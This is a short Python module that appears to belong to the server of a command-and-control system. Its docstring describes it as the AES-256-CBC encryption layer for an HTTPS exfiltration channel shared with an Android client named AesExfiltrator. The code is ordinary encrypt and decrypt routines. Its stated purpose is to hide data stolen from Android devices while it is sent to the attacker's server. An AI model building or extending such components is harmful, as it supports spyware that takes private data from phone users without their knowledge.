"""
Application-level AES-256-CBC encryption for the HTTPS exfiltration channel.

The AES key is shared between this server and the Android client
(AesExfiltrator.kt, key constant in C2NetworkModule.kt).

Wire format: Base64( IV[16 bytes] || AES-CBC-ciphertext )
"""

import base64
import logging

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

from config import AES_SECRET_KEY

logger = logging.getLogger("c2-server.crypto")

_KEY_BYTES = AES_SECRET_KEY.encode("utf-8")  # must be exactly 32 bytes


def decrypt(ciphertext_b64: str) -> str:
    """Decrypt a base64-encoded AES-CBC payload. IV is the first 16 bytes."""
    raw = base64.b64decode(ciphertext_b64)
    iv = raw[:16]
    ciphertext = raw[16:]
    cipher = AES.new(_KEY_BYTES, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return plaintext.decode("utf-8")


def encrypt(plaintext: str) -> str:
    """Encrypt a string with AES-256-CBC. Returns base64( IV || ciphertext )."""
    import os
    iv = os.urandom(16)
    cipher = AES.new(_KEY_BYTES, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext.encode("utf-8"), AES.block_size))
    return base64.b64encode(iv + ciphertext).decode("ascii")
